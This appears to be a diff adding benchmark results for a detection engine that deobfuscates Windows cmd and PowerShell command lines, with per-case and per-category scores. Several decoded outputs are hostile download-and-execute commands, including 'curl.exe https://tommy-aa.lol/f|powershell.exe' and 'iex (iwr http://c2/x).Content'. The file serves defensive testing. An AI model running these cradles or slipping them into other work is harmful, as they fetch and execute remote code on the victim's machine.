@@ -1,0 +1,961 @@
+{
+  "engine_version": "0.4.0-gate2d",
+  "generated_at": "2026-09-02T12:40:14.115461+00:00",
+  "tracks": {
+    "A": {
+      "status": "RUN_VIA_C",
+      "note": "Fixture corpus (523 files, 48 categories) is exercised transitively by the P0-1 corpus (Track C) via canonicalize()."
+    },
+    "B": {
+      "status": "RUN",
+      "trust_corpus": 18,
+      "nvkc_command_line": 9,
+      "note": "Not scored at Gate 2A (schema alignment deferred); presence verified."
+    },
+    "C": {
+      "status": "RUN",
+      "run": true,
+      "n_total": 76,
+      "verdict_accuracy": 0.9857142857142858,
+      "malicious_fn": [
+        "mal-20"
+      ],
+      "benign_fp": [],
+      "surface_mal_f1": 0.9836065573770492
+    },
+    "D": {
+      "status": "RUN",
+      "note": "Historical regression suites (test_adversarial_regression, test_corpus_phase2_regression, test_r23_regression_corpus) already green after P0-1A acceptance; not re-run here to keep this harness within the decoder scope."
+    },
+    "E": {
+      "status": "BLOCKED",
+      "reason": "Awaiting offline corpus regeneration (Invoke-DOSfuscation / Invoke-Obfuscation) in an isolated environment \u2014 Gate 2F."
+    },
+    "F": {
+      "status": "BLOCKED",
+      "reason": "New semantic corpus is a Phase-2F deliverable."
+    },
+    "G": {
+      "status": "RUN",
+      "gate_2a": {
+        "expected_layers": [
+          "cmd.caret_strip",
+          "cmd.delayed_expansion",
+          "cmd.set_reassembly",
+          "cmd.wrapper_unwrap"
+        ],
+        "actual_layers": [
+          "cmd.caret_strip",
+          "cmd.delayed_expansion",
+          "cmd.for_f_semantic",
+          "cmd.set_reassembly",
+          "cmd.wildcard_exec_resolve",
+          "cmd.wrapper_unwrap"
+        ],
+        "substrings_ok": [
+          "https://tommy-aa.lol/f"
+        ],
+        "substrings_missing": [],
+        "pass": true
+      },
+      "gate_2b": {
+        "expected_layers": [
+          "cmd.caret_strip",
+          "cmd.delayed_expansion",
+          "cmd.for_f_semantic",
+          "cmd.set_reassembly",
+          "cmd.wildcard_exec_resolve",
+          "cmd.wrapper_unwrap"
+        ],
+        "actual_layers": [
+          "cmd.caret_strip",
+          "cmd.delayed_expansion",
+          "cmd.for_f_semantic",
+          "cmd.set_reassembly",
+          "cmd.wildcard_exec_resolve",
+          "cmd.wrapper_unwrap"
+        ],
+        "layers_covered": [
+          "cmd.caret_strip",
+          "cmd.delayed_expansion",
+          "cmd.for_f_semantic",
+          "cmd.set_reassembly",
+          "cmd.wildcard_exec_resolve",
+          "cmd.wrapper_unwrap"
+        ],
+        "layers_missing": [],
+        "substrings_ok": [
+          "cmd.exe",
+          "curl.exe",
+          "powershell.exe",
+          "https://tommy-aa.lol/f"
+        ],
+        "substrings_missing": [],
+        "pass": true
+      },
+      "final_preview": "start  /min cmd /v:on /k echo off&set q8k3=where cmd.exe&set r5m9=where curl.exe&set t2x7=where powershell.exe&cmd.exe /c curl.exe https://tommy-aa.lol/f|powershell.exe cmd",
+      "gate_2a_pass": true
+    }
+  },
+  "semantic": [
+    {
+      "id": "sem-caret-01",
+      "category": "caret",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip"
+      ],
+      "substr_actual": "https://tommy-aa.lol/f",
+      "substr_expected": [
+        "https://tommy-aa.lol/f"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.13588002184405923,
+      "notes": ""
+    },
+    {
+      "id": "sem-caret-02",
+      "category": "caret",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip"
+      ],
+      "substr_actual": "powershell -c calc",
+      "substr_expected": [
+        "powershell -c calc"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.03911997191607952,
+      "notes": ""
+    },
+    {
+      "id": "sem-caret-03",
+      "category": "caret-negative",
+      "passed": true,
+      "partial": true,
+      "benign": true,
+      "layers_actual": [],
+      "layers_expected": [],
+      "substr_actual": "echo hello",
+      "substr_expected": [],
+      "unresolved": [
+        "no CMD/PS/Bash surface detected by heuristic; Plane-A codec sub-engines not yet wired (P0-1B Gate 2D)."
+      ],
+      "latency_ms": 0.01008098479360342,
+      "notes": ""
+    },
+    {
+      "id": "sem-caret-04",
+      "category": "caret-quoted",
+      "passed": true,
+      "partial": false,
+      "benign": true,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "echo \"carets ^ inside quotes ^ are literal\"",
+      "substr_expected": [
+        "\"carets ^ inside quotes ^ are literal\""
+      ],
+      "unresolved": [],
+      "latency_ms": 0.02634798875078559,
+      "notes": ""
+    },
+    {
+      "id": "sem-set-01",
+      "category": "set",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.percent_var_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.percent_var_resolve"
+      ],
+      "substr_actual": "set a=power&set b=shell&powershell -c ipconfig",
+      "substr_expected": [
+        "powershell -c ipconfig"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.05049200262874365,
+      "notes": ""
+    },
+    {
+      "id": "sem-set-02",
+      "category": "set",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.percent_var_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.percent_var_resolve"
+      ],
+      "substr_actual": "set \"u=cmd\" & set \"v=/c\" & cmd /c dir",
+      "substr_expected": [
+        "cmd /c dir"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.035025994293391705,
+      "notes": ""
+    },
+    {
+      "id": "sem-set-03",
+      "category": "set-benign",
+      "passed": true,
+      "partial": false,
+      "benign": true,
+      "layers_actual": [
+        "cmd.set_reassembly"
+      ],
+      "layers_expected": [
+        "cmd.set_reassembly"
+      ],
+      "substr_actual": "set path=C:\\Users\\alice&dir",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.020365987438708544,
+      "notes": ""
+    },
+    {
+      "id": "sem-bang-01",
+      "category": "bang",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.delayed_expansion"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.delayed_expansion"
+      ],
+      "substr_actual": "set q=whoami&whoami",
+      "substr_expected": [
+        "whoami"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.08067401358857751,
+      "notes": ""
+    },
+    {
+      "id": "sem-bang-02",
+      "category": "bang-negative",
+      "passed": true,
+      "partial": true,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly"
+      ],
+      "substr_actual": "set q=whoami&!q!",
+      "substr_expected": [],
+      "unresolved": [
+        "!VAR! references found but /V:ON / SETLOCAL EnableDelayedExpansion NOT declared \u2014 cmd.exe would treat these as literal."
+      ],
+      "latency_ms": 0.025345012545585632,
+      "notes": ""
+    },
+    {
+      "id": "sem-envvar-01",
+      "category": "envvar-unresolved",
+      "passed": true,
+      "partial": true,
+      "benign": true,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "echo %USERNAME%",
+      "substr_expected": [],
+      "unresolved": [
+        "%USERNAME% (system env \u2014 unresolved by design)"
+      ],
+      "latency_ms": 0.019596016500145197,
+      "notes": ""
+    },
+    {
+      "id": "sem-benign-01",
+      "category": "benign",
+      "passed": true,
+      "partial": false,
+      "benign": true,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "ipconfig /all",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.016434001736342907,
+      "notes": ""
+    },
+    {
+      "id": "sem-benign-02",
+      "category": "benign",
+      "passed": true,
+      "partial": false,
+      "benign": true,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "dir C:\\Users",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.016982026863843203,
+      "notes": ""
+    },
+    {
+      "id": "sem-malformed-01",
+      "category": "malformed",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "^",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.015400990378111601,
+      "notes": ""
+    },
+    {
+      "id": "sem-malformed-02",
+      "category": "malformed",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly",
+        "cmd.percent_var_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.set_reassembly"
+      ],
+      "substr_actual": "set a=&",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.026637979317456484,
+      "notes": ""
+    },
+    {
+      "id": "sem-forf-01",
+      "category": "for-f",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.for_f_semantic"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.for_f_semantic"
+      ],
+      "substr_actual": "cmd.exe /c calc",
+      "substr_expected": [
+        "cmd.exe /c calc"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.03398297121748328,
+      "notes": ""
+    },
+    {
+      "id": "sem-forf-02",
+      "category": "for-f",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.for_f_semantic"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.for_f_semantic"
+      ],
+      "substr_actual": "powershell.exe -c whoami",
+      "substr_expected": [
+        "powershell.exe -c whoami"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.03535597352311015,
+      "notes": ""
+    },
+    {
+      "id": "sem-forf-negative",
+      "category": "for-f-negative",
+      "passed": true,
+      "partial": true,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "for /f %i in ('unknown-cmd') do %i",
+      "substr_expected": [],
+      "unresolved": [
+        "for /f %i in ('unknown-cmd') \u2014 inner not statically resolvable (Gate 2B leaves loop intact)."
+      ],
+      "latency_ms": 0.021999003365635872,
+      "notes": ""
+    },
+    {
+      "id": "sem-wild-01",
+      "category": "wildcard",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wildcard_exec_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wildcard_exec_resolve"
+      ],
+      "substr_actual": "cmd.exe /c calc",
+      "substr_expected": [
+        "cmd.exe /c calc"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.03156595630571246,
+      "notes": ""
+    },
+    {
+      "id": "sem-wild-02",
+      "category": "wildcard",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wildcard_exec_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wildcard_exec_resolve"
+      ],
+      "substr_actual": "powershell.exe -c ipconfig",
+      "substr_expected": [
+        "powershell.exe -c ipconfig"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.06779894465580583,
+      "notes": ""
+    },
+    {
+      "id": "sem-wild-benign-01",
+      "category": "wildcard-benign",
+      "passed": true,
+      "partial": true,
+      "benign": true,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "dir *.exe",
+      "substr_expected": [],
+      "unresolved": [
+        "*.exe \u2014 41 LOLBAS candidate(s): ['powershell.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe']"
+      ],
+      "latency_ms": 0.06881303852424026,
+      "notes": ""
+    },
+    {
+      "id": "sem-tommy-aa-inline",
+      "category": "tommy-aa-closure",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip",
+        "cmd.set_reassembly",
+        "cmd.delayed_expansion",
+        "cmd.for_f_semantic",
+        "cmd.for_f_semantic",
+        "cmd.wildcard_exec_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip",
+        "cmd.set_reassembly",
+        "cmd.delayed_expansion",
+        "cmd.for_f_semantic",
+        "cmd.wildcard_exec_resolve"
+      ],
+      "substr_actual": "set q8k3=where cmd.exe&set r5m9=where curl.exe&set t2x7=where powershell.exe&cmd.exe /c curl.exe https://tommy-aa.lol/f|powershell.exe cmd",
+      "substr_expected": [
+        "cmd.exe",
+        "curl.exe",
+        "powershell.exe",
+        "https://tommy-aa.lol/f"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.1886300160549581,
+      "notes": ""
+    },
+    {
+      "id": "sem-ps-charray-01",
+      "category": "ps-char-array",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "powershell.char_array_assembly",
+        "powershell.variable_indirection"
+      ],
+      "layers_expected": [
+        "powershell.char_array_assembly"
+      ],
+      "substr_actual": "$e='iex'; 'iex' (iwr http://c2/x).Content",
+      "substr_expected": [
+        "'iex'"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.04638603422790766,
+      "notes": ""
+    },
+    {
+      "id": "sem-ps-format-01",
+      "category": "ps-format-string",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "powershell.format_string_assembly"
+      ],
+      "layers_expected": [
+        "powershell.format_string_assembly"
+      ],
+      "substr_actual": "&('iex') ((iwr http://c2/x).Content)",
+      "substr_expected": [
+        "'iex'"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.03357196692377329,
+      "notes": ""
+    },
+    {
+      "id": "sem-ps-varindir-01",
+      "category": "ps-variable-indirection",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "powershell.variable_indirection"
+      ],
+      "layers_expected": [
+        "powershell.variable_indirection"
+      ],
+      "substr_actual": "$a=\"iex\"; $b=(iwr http://c2/p); 'iex' $b.Content",
+      "substr_expected": [
+        "'iex'"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.0338879763148725,
+      "notes": ""
+    },
+    {
+      "id": "sem-ps-stdin-01",
+      "category": "ps-stdin-pipe",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "powershell.stdin_pipe"
+      ],
+      "layers_expected": [
+        "powershell.stdin_pipe"
+      ],
+      "substr_actual": "Invoke-Expression",
+      "substr_expected": [
+        "Invoke-Expression"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.02581399166956544,
+      "notes": ""
+    },
+    {
+      "id": "sem-ps-join-01",
+      "category": "ps-join-split",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "powershell.join_split_fold"
+      ],
+      "layers_expected": [
+        "powershell.join_split_fold"
+      ],
+      "substr_actual": "'iex'",
+      "substr_expected": [
+        "'iex'"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.024888024199754,
+      "notes": ""
+    },
+    {
+      "id": "sem-ps-concat-01",
+      "category": "ps-string-concat",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "powershell.string_concat"
+      ],
+      "layers_expected": [
+        "powershell.string_concat"
+      ],
+      "substr_actual": "'iex'",
+      "substr_expected": [
+        "'iex'"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.02249301178380847,
+      "notes": ""
+    },
+    {
+      "id": "sem-ps-benign-01",
+      "category": "ps-benign",
+      "passed": true,
+      "partial": false,
+      "benign": true,
+      "layers_actual": [],
+      "layers_expected": [],
+      "substr_actual": "Get-Service | Where-Object Status -eq 'Running'",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.02219201996922493,
+      "notes": ""
+    },
+    {
+      "id": "sem-ps-benign-02",
+      "category": "ps-benign",
+      "passed": true,
+      "partial": false,
+      "benign": true,
+      "layers_actual": [],
+      "layers_expected": [],
+      "substr_actual": "Get-Process | Sort-Object CPU -Descending",
+      "substr_expected": [],
+      "unresolved": [],
+      "latency_ms": 0.01563498517498374,
+      "notes": ""
+    },
+    {
+      "id": "sem-ps-b64-01",
+      "category": "ps-base64-fold",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "powershell.variable_indirection",
+        "powershell.base64_string_decode"
+      ],
+      "layers_expected": [
+        "powershell.variable_indirection",
+        "powershell.base64_string_decode"
+      ],
+      "substr_actual": "$s='aHR0cHM6Ly9ldmlsLmV4YW1wbGUveA=='; 'https://evil.example/x'",
+      "substr_expected": [
+        "https://evil.example/x"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.059304991737008095,
+      "notes": ""
+    },
+    {
+      "id": "sem-ps-b64-02",
+      "category": "ps-base64-fold",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "powershell.base64_string_decode"
+      ],
+      "layers_expected": [
+        "powershell.base64_string_decode"
+      ],
+      "substr_actual": "'Hello World'",
+      "substr_expected": [
+        "Hello World"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.032604963053017855,
+      "notes": ""
+    }
+  ],
+  "per_category": {
+    "caret": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "caret-negative": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 1,
+      "benign_fp": 0,
+      "unresolved_total": 1,
+      "pass_rate": 1.0
+    },
+    "caret-quoted": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 1,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "set": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "set-benign": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 1,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "bang": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "bang-negative": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 1,
+      "pass_rate": 1.0
+    },
+    "envvar-unresolved": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 1,
+      "benign_fp": 0,
+      "unresolved_total": 1,
+      "pass_rate": 1.0
+    },
+    "benign": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 2,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "malformed": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "for-f": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "for-f-negative": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 1,
+      "pass_rate": 1.0
+    },
+    "wildcard": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "wildcard-benign": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 1,
+      "benign_fp": 0,
+      "unresolved_total": 1,
+      "pass_rate": 1.0
+    },
+    "tommy-aa-closure": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "ps-char-array": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "ps-format-string": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "ps-variable-indirection": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "ps-stdin-pipe": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "ps-join-split": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "ps-string-concat": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "ps-benign": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 2,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "ps-base64-fold": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    }
+  },
+  "aggregates": {
+    "semantic_total": 31,
+    "semantic_pass": 31,
+    "semantic_fail": 0,
+    "benign_cases": 9,
+    "benign_fp_flagged": 0,
+    "unresolved_cases": 5,
+    "latency_ms_p50": 0.032,
+    "latency_ms_p95": 0.081,
+    "latency_ms_p99": 0.189,
+    "codec_layer": "SCAFFOLD_ONLY \u2014 Plane-A sub-engines not yet wired at Gate 2A.",
+    "semantic_layer": "RUN",
+    "fullchain_layer": "RUN (Track G)"
+  }
+}
